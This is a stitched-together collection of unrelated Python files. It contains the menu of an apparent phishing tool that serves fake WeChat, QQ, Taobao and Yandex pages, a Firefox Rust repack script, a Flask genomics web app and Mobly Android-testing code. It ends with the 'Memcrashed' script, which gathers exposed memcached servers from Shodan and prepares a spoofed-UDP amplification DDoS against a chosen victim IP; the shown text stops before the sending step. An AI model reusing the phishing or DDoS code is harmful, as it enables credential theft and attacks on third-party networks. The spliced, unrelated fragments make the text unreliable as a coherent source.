			whatsapp()
			main()

		#Wechat
		elif int(choice_2) == 2:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			WeChat()
			main()

		#3

		#Weibo
		elif int(choice_2) == 4:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			Weibo()
			main()

		elif int(choice_2) == 5:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			QQ()
			main()

	#Mailing Services
	if choice == 2:
		print """
 1.QQ Mail
 2.Yandex Mail
 00.Back To Main Menu
	"""
		choice_2 = raw_input(" Second Choice > ")

		if choice_2 == "00":
			main()

		elif int(choice_2) == 2:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make("svg")
			Serve_it(port)
			Yandex()
			main()

	#eCommerce
	if choice == 3:
		print """
 1.Alibaba
 2.Aliexpress
 3.Taobao
 4.Tmall
 5.1688.com
 6.Alimama
 7.Taobao Trips
 00.Back To Main Menu
	"""
		choice_2 = raw_input(" Second Choice > ")
		if choice_2 == "00":
			main()

		elif int(choice_2) == 3:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			Taobao()
			main()

		#4

		#5

		#6

		elif int(choice_2) == 7:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			Taobao()
			main()

	#Online Banking
	if choice == 4:
		print """
 1.AliPay
 2.Yandex Money
 3.TenPay
 00.Back To Main Menu
	"""
		choice_2 = raw_input(" Second Choice > ")
		if choice_2 == "00":
			main()

	#Passport Services
	if choice == 5:
		print """
 1.Yandex Passport
 00.Back To Main Menu
	"""
		choice_2 = raw_input(" Second Choice > ")
		if choice_2 == "00":
			main()

	#Mobile Management Software
	if choice == 6:
		print """
 1.Airdroid
 00.Back To Main Menu
	"""
		choice_2 = raw_input(" Second Choice > ")

		if choice_2 == "00":
			main()

		elif int(choice_2) == 1:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337                    
			clear()
			make()
			Serve_it(port)
			Airdroid()
			main()

	#Other Services
	if choice == 7:
		print """
 1.MyDigiPass
 2.Zapper
 3.Trustly App
 4.Yelophone
 5.Alibaba Yunos
 00.Back To Main Menu
"""
		choice_2 = raw_input(" Second Choice > ")
		if choice_2 == "00":
			main()

	#Customization
	#if choice == 8:
		#settings.read("Data/Simple.ini")
		#url = settings.get("WeChat","url")
		#image_number = settings.get("WeChat","image_number")
		#classname = settings.get("WeChat","classname")
if __name__ == '__main__':
	main()

#!/bin/env python
'''
This script downloads and repacks official rust language builds
with the necessary tool and target support for the Firefox
build environment.
'''

import requests
import toml
import os

def fetch_file(url):
  '''Download a file from the given url if it's not already present.'''
  filename = os.path.basename(url)
  if os.path.exists(filename):
    return
  r = requests.get(url, stream=True)
  r.raise_for_status()
  with open(filename, 'wb') as fd:
    for chunk in r.iter_content(4096):
      fd.write(chunk)

def fetch(url):
  '''Download and verify a package url.'''
  base = os.path.basename(url)
  print('Fetching %s...' % base)
  fetch_file(url + '.asc')
  fetch_file(url)
  fetch_file(url + '.sha256')
  fetch_file(url + '.asc.sha256')
  print('Verifying %s...' % base)
  # TODO: check for verification failure.
  os.system('shasum -c %s.sha256' % base)                    
  os.system('shasum -c %s.asc.sha256' % base)                    
  os.system('gpg --verify %s.asc %s' % (base, base))                    
  os.system('keybase verify %s.asc' % base)                    

def install(filename, target):
  '''Run a package's installer script against the given target directory.'''
  print(' Unpacking %s...' % filename)
  os.system('tar xf ' + filename)                    
  basename = filename.split('.tar')[0]
  print(' Installing %s...' % basename)
  install_opts = '--prefix=${PWD}/%s --disable-ldconfig' % target                    
  os.system('%s/install.sh %s' % (basename, install_opts))                    
  print(' Cleaning %s...' % basename)
  os.system('rm -rf %s' % basename)                    

def package(manifest, pkg, target):
  '''Pull out the package dict for a particular package and target
  from the given manifest.'''
  version = manifest['pkg'][pkg]['version']
  info = manifest['pkg'][pkg]['target'][target]
  return (version, info)

def repack(host, targets, channel='stable'):
  url = 'https://static.rust-lang.org/dist/channel-rust-' + channel + '.toml'
  req = requests.get(url)
  req.raise_for_status()
  manifest = toml.loads(req.content)
  if manifest['manifest-version'] != '2':
    print('ERROR: unrecognized manifest version %s.' % manifest['manifest-version'])
    return
  print('Using manifest for rust %s as of %s.' % (channel, manifest['date']))
  rustc_version, rustc = package(manifest, 'rustc', host)
  if rustc['available']:
    print('rustc %s\n  %s\n  %s' % (rustc_version, rustc['url'], rustc['hash']))
    fetch(rustc['url'])
  cargo_version, cargo = package(manifest, 'cargo', host)
  if cargo['available']:
    print('cargo %s\n  %s\n  %s' % (cargo_version, cargo['url'], cargo['hash']))
    fetch(cargo['url'])
  stds = []
  for target in targets:
      version, info = package(manifest, 'rust-std', target)
      if info['available']:
        print('rust-std %s\n  %s\n  %s' % (version, info['url'], info['hash']))
        fetch(info['url'])
        stds.append(info)
  print('Installing packages...')
  tar_basename = 'rustc-%s-repack' % host
  install_dir = 'rustc'
  os.system('rm -rf %s' % install_dir)                    
  install(os.path.basename(rustc['url']), install_dir)
  install(os.path.basename(cargo['url']), install_dir)
  for std in stds:
    install(os.path.basename(std['url']), install_dir)
  print('Tarring %s...' % tar_basename)
  os.system('tar cjf %s.tar.bz2 %s/*' % (tar_basename, install_dir))                    
  os.system('rm -rf %s' % install_dir)                    

# rust platform triples
android="arm-linux-androideabi"
linux64="x86_64-unknown-linux-gnu"
linux32="i686-unknown-linux-gnu"
mac64="x86_64-apple-darwin"
mac32="i686-apple-darwin"
win64="x86_64-pc-windows-msvc"
win32="i686-pc-windows-msvc"

if __name__ == '__main__':
  repack(mac64, [mac64, mac32])
  repack(win32, [win32])
  repack(win64, [win64])
  repack(linux64, [linux64, linux32])

'''
install_rustc() {
  pkg=$(cat ${IDX} | grep ^rustc | grep $1)
  base=${pkg%%.tar.*}
  echo "Installing $base..."
  tar xf ${pkg}
  ${base}/install.sh ${INSTALL_OPTS}
  rm -rf ${base}
}

install_std() {
  for arch in $@; do
    for pkg in $(cat ${IDX} | grep rust-std | grep $arch); do
      base=${pkg%%.tar.*}
      echo "Installing $base..."
      tar xf ${pkg}
      ${base}/install.sh ${INSTALL_OPTS}
      rm -rf ${base}
    done
  done
}

check() {
  if test -x ${TARGET}/bin/rustc; then
    file ${TARGET}/bin/rustc
    ${TARGET}/bin/rustc --version
  elif test -x ${TARGET}/bin/rustc.exe; then
    file ${TARGET}/bin/rustc.exe
    ${TARGET}/bin/rustc.exe --version
  else
    die "ERROR: Couldn't fine rustc executable"
  fi
  echo "Installed components:"
  for component in $(cat ${TARGET}/lib/rustlib/components); do
    echo "  $component"
  done
  echo
}

test -n "$TASK_ID" && set -v

linux64="x86_64-unknown-linux-gnu"
linux32="i686-unknown-linux-gnu"

android="arm-linux-androideabi"

mac64="x86_64-apple-darwin"
mac32="i686-apple-darwin"

win64="x86_64-pc-windows-msvc"
win32="i686-pc-windows-msvc"
win32_i586="i586-pc-windows-msvc"

# Fetch the manifest

IDX=channel-rustc-${RUST_CHANNEL}

fetch ${IDX}
verify ${IDX}

TARGET=rustc
INSTALL_OPTS="--prefix=${PWD}/${TARGET} --disable-ldconfig"

# Repack the linux64 builds.
repack_linux64() {
  fetch_rustc $linux64
  fetch_std $linux64 $linux32

  rm -rf ${TARGET}

  install_rustc $linux64
  install_std $linux64 $linux32

  tar cJf rustc-$linux64-repack.tar.xz ${TARGET}/*
  check ${TARGET}
}

# Repack the win64 builds.
repack_win64() {
  fetch_rustc $win64
  fetch_std $win64

  rm -rf ${TARGET}

  install_rustc $win64
  install_std $win64

  tar cjf rustc-$win64-repack.tar.bz2 ${TARGET}/*
  check ${TARGET}
}

# Repack the win32 builds.
repack_win32() {
  fetch_rustc $win32
  fetch_std $win32

  rm -rf ${TARGET}

  install_rustc $win32
  install_std $win32

  tar cjf rustc-$win32-repack.tar.bz2 ${TARGET}/*
  check ${TARGET}
}

# Repack the mac builds.
repack_mac() {
  fetch_rustc $mac64
  fetch_std $mac64 $mac32

  rm -rf ${TARGET}

  install_rustc $mac64
  install_std $mac64 $mac32

  tar cjf rustc-mac-repack.tar.bz2 ${TARGET}/*
  check ${TARGET}
}

# Repack mac cross build.
repack_mac_cross() {
  fetch_rustc $linux64
  fetch_std $linux64

  rm -rf ${TARGET}

  install_rustc $linux64
  install_std $linux64 $mac64 $mac32

  tar cJf rustc-mac-cross-repack.tar.xz ${TARGET}/*
  check ${TARGET}
}

repack_win32
repack_win64
repack_linux64
repack_mac
repack_mac_cross

rm -rf ${TARGET}
'''

# Variables
SAMPLE_FILES = [
    ('E. coli', 'https://raw.githubusercontent.com/cheukyin699/genset-training-csvs/master/E_Coli_Training.csv'),
    ('S. dysenteriae', 'https://raw.githubusercontent.com/cheukyin699/genset-training-csvs/master/S_Dysenterae_Training.csv'),
    ('S. typhimurium', 'https://raw.githubusercontent.com/cheukyin699/genset-training-csvs/master/S_Typhimurium_Training.csv'),
    ('P. syringae', 'https://raw.githubusercontent.com/cheukyin699/genset-training-csvs/master/P_Syringae_Training.csv'),
    ('X. campestris', 'https://raw.githubusercontent.com/cheukyin699/genset-training-csvs/master/X_Campestris_Training.csv'),
    ('C. trachematis', 'https://raw.githubusercontent.com/cheukyin699/genset-training-csvs/master/C_Trachomatis_Training.csv'),
    ('E. coli + S. dysenteriae', 'https://raw.githubusercontent.com/cheukyin699/genset-training-csvs/master/E_Coli_S_Dysenteriae_Training.csv'),
    ('E. coli + S. dysenteriae + S. typhimurium', 'https://raw.githubusercontent.com/cheukyin699/genset-training-csvs/master/E_Coli_S_Dysenteriae_S_Typhimur_Training.csv'),
]

# Functions
def sid_is_valid(sid):
    '''
    Checks to see if the session ID is valid or not. Valid session IDs do not
    contain slashes of any kind, and should not attempt to do any directory
    traversal.

    Temporarily fix: Only works for SIDs with a length of < 10.                    
    '''
    if '/' in sid or '\\' in sid:                    
        return False                    

    # FIXME: Only works for SIDs with length < 10
    if len(sid) >= 10:                    
        return False                    

    return True                    

from flask import render_template, redirect, url_for, request, flash, abort,\
                    Markup, send_from_directory
from app import app, fbdb
from .forms import ProcessingForm, FILE_MAP
from . import utils
from shutil import copyfile, rmtree
import os
import tempfile
import requests
import subprocess as sub

@app.route('/')
@app.route('/about')
def index():
    return render_template('index.html',
                            title="GenSET")

@app.route('/experiment', methods=['GET'])
def experiment():
    form = ProcessingForm(request.form)
    return render_template('experiment/index.html',
                            title="Try it Out!",                    
                            sitekey=app.config['G_CAPTCHA_SITEKEY'],                    
                            form=form,                    
                            files=utils.SAMPLE_FILES)

@app.route('/upload', methods=['POST'])
def upload():
    # Check Google reCAPTCHA v2
    data = {
        'secret': app.config['G_CAPTCHA_SECRET'],
        'response': request.form['g-recaptcha-response'],
        'remoteip': request.remote_addr
    }
    resp = requests.post(app.config['G_CAPTCHA_VERIFY'],
                        data=data).json()

    # Check to see if user is a bot
    if resp['success']:
        # Check to see if it is a valid submission
        form = ProcessingForm()
        if not form.validate_on_submit():
            # Invalid submissions get flashed
            for field, errors in form.errors.items():
                for e in errors:
                    flash('Error in %s: %s' % (getattr(form, field).label.text, e))
        else:                    
            path = tempfile.mkdtemp(dir=app.config['UPLOAD_FOLDER'], prefix='')
            session_id = os.path.basename(path)

            # Save the files
            request.files['testcsv'].save(os.path.join(path, app.config['TESTING_FN']))                    

            if request.files['trainingcsv'].filename != '':
                request.files['trainingcsv'].save(os.path.join(path, app.config['TRAINING_FN']))                    
            else:                    
                try:
                    fn = FILE_MAP[request.form['trainingset']]
                    copyfile(os.path.join(app.config['TRAINING_FOLDER'], fn),                    
                             os.path.join(path, app.config['TRAINING_FN']))
                except KeyError:
                    flash('Error: \'%s\' is not supported' % request.form['trainingset'])

            # Be flashy
            link = '<a href="%s" class="alert-link">page</a>' % url_for('view', sid=session_id)                    
            success_txt = 'Success! To view progress later, bookmark the %s' % link                    
            flash(Markup(success_txt))                    

            # If the path exists, render the view
            f = open(os.path.join(path, 'logs.txt'), 'w')                    
            env = os.environ.copy()
            env['API_KEY'] = app.config['API_KEY']
            sub.Popen(['python', 'scripts/master.py', session_id, request.form['trainingset']],
                        stdout=f, stderr=f, env=env)
            return redirect(url_for('view', sid=session_id))
    else:                    
        # Show all authentication errors
        flash('Error: %s' % ', '.join(resp['error-codes']))

    return redirect(url_for('experiment',                    
                            title="Try it Out!",                    
                            sitekey=app.config['G_CAPTCHA_SITEKEY'],                    
                            form=form,                    
                            files=utils.SAMPLE_FILES))                    

@app.route('/view/<sid>')
def view(sid):
    if '/' not in sid:                    
        path = os.path.join(app.config['UPLOAD_FOLDER'], sid)                                        
        if os.path.isdir(path):                    
            using_firebase = 'true' if app.config['FIREBASE'] else 'false'
            return render_template('view.html',                    
            sid=sid, title="Progress for %s" % sid, using_firebase=using_firebase)                    
        else:                    
            abort(404)                    
    else:                    
        abort(403)                    

@app.route('/api/script_update', methods=['POST'])
def script_update():
    if not app.config['FIREBASE']:                    
        abort(400)                    
    if request.json is None:                    
        abort(400)                    
    if request.json['auth_token'] != app.config['API_KEY']:
        abort(403)                    

    try:
        sid = request.json['session_id']
        progress = int(request.json['progress'])
        text = request.json['text']
    except ValueError:
        # If progress isn't an int, or if any of the fields are missing, abort.
        abort(400)                    

    # Actually upload the data
    data = { "progress": progress, "text": text }
    fbdb.child('sessions').child(sid).set(data)
    return '', 200                    

@app.route('/api/uploads/<sid>/logs')
def get_logs(sid):
    if '/' not in sid:                    
        path = os.path.join(app.config['UPLOAD_FOLDER'], sid)                                        
        if os.path.isfile(os.path.join(path, app.config['LOG_FILE'])):                    
            return send_from_directory(directory=path,                    
                                        filename=app.config['LOG_FILE'])
        else:                    
            abort(404)                    
    else:                    
        abort(403)                    

@app.route('/api/uploads/<sid>/download')
def download(sid):
    if not utils.sid_is_valid(sid):                    
        abort(400)                    

    path = os.path.join(app.config['UPLOAD_FOLDER'], sid)                                        

    if os.path.isfile(os.path.join(path, app.config['RESULTS_ZIP'])):                    
        return send_from_directory(directory=path,                    
                                    filename=app.config['RESULTS_ZIP'])                    
    else:                    
        abort(404)                    

@app.route('/api/uploads/<sid>', methods=['DELETE'])
def delete_upload(sid):
    if not utils.sid_is_valid(sid):                    
        abort(400)                    

    # Remove the entire upload
    path = os.path.join(app.config['UPLOAD_FOLDER'], sid)                                        

    # If it exists, of course
    if os.path.isdir(path):                    
        if not app.config['TESTING']:                    
            rmtree(path)                    
    else:                    
        abort(404)                    

    # Remove from firebase
    if app.config['FIREBASE']:                    
        fbdb.child('sessions').child(sid).remove()                    

    flash('Success! Deleted run data for "%s"' % sid)                    
    return '', 200                    

#!/usr/bin/env python3.4
#
# Copyright 2016 Google Inc.
# 
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
# 
#     http://www.apache.org/licenses/LICENSE-2.0
# 
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from builtins import str

import logging
import random                    
import socket                    
import subprocess
import time                    


class AdbError(Exception):
    """Raised when there is an error in adb operations."""

    def __init__(self, cmd, stdout, stderr, ret_code):
        self.cmd = cmd
        self.stdout = stdout
        self.stderr = stderr
        self.ret_code = ret_code

    def __str__(self):
        return ('Error executing adb cmd "%s". ret: %d, stdout: %s, stderr: %s'
                ) % (self.cmd, self.ret_code, self.stdout, self.stderr)


def list_occupied_adb_ports():
    """Lists all the host ports occupied by adb forward.

    This is useful because adb will silently override the binding if an attempt
    to bind to a port already used by adb was made, instead of throwing binding
    error. So one should always check what ports adb is using before trying to
    bind to a port with adb.

    Returns:
        A list of integers representing occupied host ports.
    """
    out = AdbProxy().forward('--list')
    clean_lines = str(out, 'utf-8').strip().split('\n')
    used_ports = []
    for line in clean_lines:
        tokens = line.split(' tcp:')
        if len(tokens) != 3:
            continue
        used_ports.append(int(tokens[1]))
    return used_ports


class AdbProxy():                    
    """Proxy class for ADB.

    For syntactic reasons, the '-' in adb commands need to be replaced with
    '_'. Can directly execute adb commands on an object:
    >> adb = AdbProxy(<serial>)
    >> adb.start_server()
    >> adb.devices() # will return the console output of "adb devices".
    """

    def __init__(self, serial=''):
        self.serial = serial
        if serial:                    
            self.adb_str = 'adb -s %s' % serial                    
        else:                    
            self.adb_str = 'adb'                    

    def _exec_cmd(self, cmd):                    
        """Executes adb commands in a new shell.                    

        This is specific to executing adb binary because stderr is not a good                    
        indicator of cmd execution status.                    

        Args:
            cmds: A string that is the adb command to execute.                    

        Returns:
            The output of the adb command run if exit code is 0.

        Raises:
            AdbError is raised if the adb command exit code is not 0.
        """
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)                    
        (out, err) = proc.communicate()
        ret = proc.returncode
        logging.debug('cmd: %s, stdout: %s, stderr: %s, ret: %s', cmd, out,                    
                      err, ret)
        if ret == 0:
            return out
        else:                    
            raise AdbError(cmd=cmd, stdout=out, stderr=err, ret_code=ret)                    

    def _exec_adb_cmd(self, name, arg_str):                    
        return self._exec_cmd(' '.join((self.adb_str, name, arg_str)))                    

    def tcp_forward(self, host_port, device_port):
        """Starts tcp forwarding.

        Args:
            host_port: Port number to use on the computer.
            device_port: Port number to use on the android device.
        """
        self.forward('tcp:%d tcp:%d' % (host_port, device_port))                    

    def getprop(self, prop_name):
        """Get a property of the device.

        This is a convenience wrapper for "adb shell getprop xxx".

        Args:
            prop_name: A string that is the name of the property to get.

        Returns:
            A string that is the value of the property, or None if the property
            doesn't exist.
        """
        return self.shell('getprop %s' % prop_name).decode('utf-8').strip()

    def __getattr__(self, name):
        def adb_call(*args):                    
            clean_name = name.replace('_', '-')
            arg_str = ' '.join(str(elem) for elem in args)                    
            return self._exec_adb_cmd(clean_name, arg_str)                    

        return adb_call

#/usr/bin/env python3.4
#
# Copyright 2016 Google Inc.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""Base class for clients that communicate with apps over a JSON RPC interface.

The JSON protocol expected by this module is:

Request:
{
    "id": <monotonically increasing integer containing the ID of this request>
    "method": <string containing the name of the method to execute>
    "params": <JSON array containing the arguments to the method>
}

Response:
{
    "id": <int id of request that this response maps to>,
    "result": <Arbitrary JSON object containing the result of executing the
               method. If the method could not be executed or returned void,
               contains 'null'.>,
    "error": <String containing the error thrown by executing the method.
              If no error occurred, contains 'null'.>
    "callback": <String that represents a callback ID used to identify events
                 associated with a particular CallbackHandler object.>
"""

from builtins import str

import json
import logging
import socket
import threading
import time

from mobly.controllers.android_device_lib import adb
from mobly.controllers.android_device_lib import callback_handler

# Maximum time to wait for the app to start on the device.
APP_START_WAIT_TIME = 15

# UID of the 'unknown' jsonrpc session. Will cause creation of a new session.
UNKNOWN_UID = -1

# Maximum time to wait for the socket to open on the device.
_SOCKET_CONNECTION_TIMEOUT = 60

# Maximum time to wait for a response message on the socket.
_SOCKET_READ_TIMEOUT = callback_handler.MAX_TIMEOUT


class Error(Exception):
    pass


class AppStartError(Error):
    """Raised when the app is not able to be started."""


class ApiError(Error):
    """Raised when remote API reports an error."""


class ProtocolError(Error):
    """Raised when there is some error in exchanging data with server."""
    NO_RESPONSE_FROM_HANDSHAKE = 'No response from handshake.'
    NO_RESPONSE_FROM_SERVER = 'No response from server.'
    MISMATCHED_API_ID = 'Mismatched API id.'


class JsonRpcCommand(object):
    """Commands that can be invoked on all jsonrpc clients.

    INIT: Initializes a new session.
    CONTINUE: Creates a connection.
    """
    INIT = 'initiate'
    CONTINUE = 'continue'


class JsonRpcClientBase(object):
    """Base class for jsonrpc clients that connect to remote servers.

    Connects to a remote device running a jsonrpc-compatible app. Before opening
    a connection a port forward must be setup to go over usb. This be done using
    adb.tcp_forward(). This calls the shell command adb forward <local> remote>.
    Once the port has been forwarded it can be used in this object as the port
    of communication.

    Attributes:
        host_port: (int) The host port of this RPC client.
        device_port: (int) The device port of this RPC client.
        app_name: (str) The user-visible name of the app being communicated
                  with.
        uid: (int) The uid of this session.
    """

    def __init__(self,
                 host_port,
                 device_port,
                 app_name,
                 adb_proxy,
                 log=logging.getLogger()):
        """
        Args:
            host_port: (int) The host port of this RPC client.
            device_port: (int) The device port of this RPC client.
            app_name: (str) The user-visible name of the app being communicated
                      with.
            adb_proxy: (adb.AdbProxy) The adb proxy to use to start the app.
        """
        self.host_port = host_port
        self.device_port = device_port
        self.app_name = app_name
        self.uid = None
        self._adb = adb_proxy
        self._client = None  # prevent close errors on connect failure
        self._conn = None
        self._counter = None
        self._lock = threading.Lock()
        self._event_client = None
        self._log = log

    def __del__(self):
        self.close()

    # Methods to be implemented by subclasses.

    def _do_start_app(self):
        """Starts the server app on the android device.

        Must be implemented by subclasses.
        """
        raise NotImplementedError()

    def _start_event_client(self):
        """Starts a separate JsonRpc client to the same session for propagating
        events.

        This is an optional function that should only implement if the client
        utilizes the snippet event mechanism.

        Returns:
            A JsonRpc Client object that connects to the same session as the
            one on which this function is called.
        """
        raise NotImplementedError()

    def stop_app(self):
        """Kills any running instance of the app.

        Must be implemented by subclasses.
        """
        raise NotImplementedError()

    def check_app_installed(self):
        """Checks if app is installed.

        Must be implemented by subclasses.
        """
        raise NotImplementedError()

    # Rest of the client methods.

    def start_app(self, wait_time=APP_START_WAIT_TIME):
        """Starts the server app on the android device.

        Args:
            wait_time: float, The time to wait for the app to come up before
                       raising an error.

        Raises:
            AppStartError: When the app was not able to be started.
        """
        self.check_app_installed()
        self._do_start_app()
        for _ in range(wait_time):
            time.sleep(1)
            if self._is_app_running():
                self._log.debug('Successfully started %s', self.app_name)
                return
        raise AppStartError('%s failed to start on %s.' %
                            (self.app_name, self._adb.serial))

    def connect(self, uid=UNKNOWN_UID, cmd=JsonRpcCommand.INIT):
        """Opens a connection to a JSON RPC server.

        Opens a connection to a remote client. The connection attempt will time
        out if it takes longer than _SOCKET_CONNECTION_TIMEOUT seconds. Each
        subsequent operation over this socket will time out after
        _SOCKET_READ_TIMEOUT seconds as well.

        Args:
            uid: int, The uid of the session to join, or UNKNOWN_UID to start a
                 new session.
            cmd: JsonRpcCommand, The command to use for creating the connection.

        Raises:
            IOError: Raised when the socket times out from io error
            socket.timeout: Raised when the socket waits to long for connection.
            ProtocolError: Raised when there is an error in the protocol.
        """
        self._counter = self._id_counter()
        self._conn = socket.create_connection(('127.0.0.1', self.host_port),
                                              _SOCKET_CONNECTION_TIMEOUT)
        self._conn.settimeout(_SOCKET_READ_TIMEOUT)
        self._client = self._conn.makefile(mode='brw')

        resp = self._cmd(cmd, uid)
        if not resp:
            raise ProtocolError(ProtocolError.NO_RESPONSE_FROM_HANDSHAKE)
        result = json.loads(str(resp, encoding='utf8'))
        if result['status']:
            self.uid = result['uid']
        else:
            self.uid = UNKNOWN_UID

    def close(self):
        """Close the connection to the remote client."""
        if self._conn:
            self._conn.close()
            self._conn = None

    def _adb_grep_wrapper(self, adb_shell_cmd):
        """A wrapper for the specific usage of adb shell grep in this class.

        This surpresses AdbError if the grep fails to find anything.

        Args:
            adb_shell_cmd: A string that is an adb shell cmd with grep.                    

        Returns:
            The stdout of the grep result if the grep found something, False
            otherwise.
        """
        try:
            return self._adb.shell(adb_shell_cmd).decode('utf-8')                    
        except adb.AdbError as e:
            if (e.ret_code == 1) and (not e.stdout) and (not e.stderr):
                return False
            raise

    def _cmd(self, command, uid=None):
        """Send a command to the server.

        Args:
            command: str, The name of the command to execute.
            uid: int, the uid of the session to send the command to.

        Returns:
            The line that was written back.
        """
        if not uid:
            uid = self.uid
        self._client.write(
            json.dumps({
                'cmd': command,
                'uid': uid
            }).encode("utf8") + b'\n')
        self._client.flush()
        return self._client.readline()

    def _rpc(self, method, *args):
        """Sends an rpc to the app.

        Args:
            method: str, The name of the method to execute.
            args: any, The args of the method.

        Returns:
            The result of the rpc.

        Raises:
            ProtocolError: Something went wrong with the protocol.
            ApiError: The rpc went through, however executed with errors.
        """
        with self._lock:
            apiid = next(self._counter)
            data = {'id': apiid, 'method': method, 'params': args}
            request = json.dumps(data)
            self._client.write(request.encode("utf8") + b'\n')
            self._client.flush()
            response = self._client.readline()
        if not response:
            raise ProtocolError(ProtocolError.NO_RESPONSE_FROM_SERVER)
        result = json.loads(str(response, encoding="utf8"))
        if result['error']:
            raise ApiError(result['error'])
        if result['id'] != apiid:
            raise ProtocolError(ProtocolError.MISMATCHED_API_ID)
        if result.get('callback') is not None:
            if self._event_client is None:
                self._event_client = self._start_event_client()
            return callback_handler.CallbackHandler(
                callback_id=result['callback'],
                event_client=self._event_client,
                ret_value=result['result'],
                method_name=method)
        return result['result']

    def _is_app_running(self):
        """Checks if the app is currently running on an android device.

        May be overridden by subclasses with custom sanity checks.
        """
        running = False
        try:
            self.connect()
            running = True
        finally:
            self.close()
            # This 'return' squashes exceptions from connect()
            return running

    def __getattr__(self, name):
        """Wrapper for python magic to turn method calls into RPC calls."""

        def rpc_call(*args):
            return self._rpc(name, *args)

        return rpc_call

    def _id_counter(self):
        i = 0
        while True:
            yield i
            i += 1


#-- coding: utf8 --
#!/usr/bin/env python3
import sys, os, time, shodan
from pathlib import Path
from scapy.all import *
from contextlib import contextmanager, redirect_stdout

starttime = time.time()

@contextmanager
def suppress_stdout():
    with open(os.devnull, "w") as devnull:
        with redirect_stdout(devnull):
            yield

class color:
    HEADER = '\033[0m'

keys = Path("./api.txt")
logo = color.HEADER + '''

   ███╗   ███╗███████╗███╗   ███╗ ██████╗██████╗  █████╗ ███████╗██╗  ██╗███████╗██████╗ 
   ████╗ ████║██╔════╝████╗ ████║██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
   ██╔████╔██║█████╗  ██╔████╔██║██║     ██████╔╝███████║███████╗███████║█████╗  ██║  ██║
   ██║╚██╔╝██║██╔══╝  ██║╚██╔╝██║██║     ██╔══██╗██╔══██║╚════██║██╔══██║██╔══╝  ██║  ██║
   ██║ ╚═╝ ██║███████╗██║ ╚═╝ ██║╚██████╗██║  ██║██║  ██║███████║██║  ██║███████╗██████╔╝
   ╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═════╝ 

                                        Author: @037
                                        Version: 3.2                    

####################################### DISCLAIMER ########################################
| Memcrashed is a tool that allows you to use Shodan.io to obtain hundreds of vulnerable  |
| memcached servers. It then allows you to use the same servers to launch widespread      |
| distributed denial of service attacks by forging UDP packets sourced to your victim.    |
| Default payload includes the memcached "stats" command, 10 bytes to send, but the reply |
| is between 1,500 bytes up to hundreds of kilobytes. Please use this tool responsibly.   |
| I am NOT responsible for any damages caused or any crimes committed by using this tool. |
###########################################################################################
                                                                                      
'''
print(logo)

if keys.is_file():
    with open('api.txt', 'r') as file:
        SHODAN_API_KEY=file.readline().rstrip('\n')
else:
    file = open('api.txt', 'w')
    SHODAN_API_KEY = input('[*] Please enter a valid Shodan.io API Key: ')
    file.write(SHODAN_API_KEY)
    print('[~] File written: ./api.txt')
    file.close()

while True:
    api = shodan.Shodan(SHODAN_API_KEY)
    print('')
    try:
        myresults = Path("./bots.txt")
        query = input("[*] Use Shodan API to search for affected Memcached servers? <Y/n>: ").lower()
        if query.startswith('y'):
            print('')
            print('[~] Checking Shodan.io API Key: %s' % SHODAN_API_KEY)
            results = api.search('product:"Memcached" port:11211')
            print('[✓] API Key Authentication: SUCCESS')
            print('[~] Number of bots: %s' % results['total'])
            print('')
            saveresult = input("[*] Save results for later usage? <Y/n>: ").lower()
            if saveresult.startswith('y'):
                file2 = open('bots.txt', 'a')
                for result in results['matches']:
                    file2.write(result['ip_str'] + "\n")
                print('[~] File written: ./bots.txt')
                print('')
                file2.close()
        saveme = input('[*] Would you like to use locally stored Shodan data? <Y/n>: ').lower()
        if myresults.is_file():
            if saveme.startswith('y'):
                with open('bots.txt') as my_file:
                    ip_array = [line.rstrip() for line in my_file]
        else:
            print('')
            print('[✘] Error: No bots stored locally, bots.txt file not found!')
            print('')
        if saveme.startswith('y') or query.startswith('y'):
            print('')
            target = input("[▸] Enter target IP address: ")
            power = int(input("[▸] Enter preferred power (Default 1): ") or "1")
            data = input("[▸] Enter payload contained inside packet: ") or "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"                    
            print('')
            if query.startswith('y'):
                iplist = input('[*] Would you like to display all the bots from Shodan? <Y/n>: ').lower()
                if iplist.startswith('y'):
                    print('')
                    counter= int(0)
                    for result in results['matches']:
                        host = api.host('%s' % result['ip_str'])
                        counter=counter+1
                        print('[+] Memcache Server (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, result['ip_str'], host.get('os', 'n/a'), host.get('org', 'n/a')))
                        time.sleep(1.1 - ((time.time() - starttime) % 1.1))
            if saveme.startswith('y'):
                iplistlocal = input('[*] Would you like to display all the bots stored locally? <Y/n>: ').lower()
                if iplistlocal.startswith('y'):
                    print('')
                    counter= int(0)
                    for x in ip_array:
                        host = api.host('%s' % x)
                        counter=counter+1
                        print('[+] Memcache Server (%d) | IP: %s | OS: %s | ISP: %s |' % (counter, x, host.get('os', 'n/a'), host.get('org', 'n/a')))
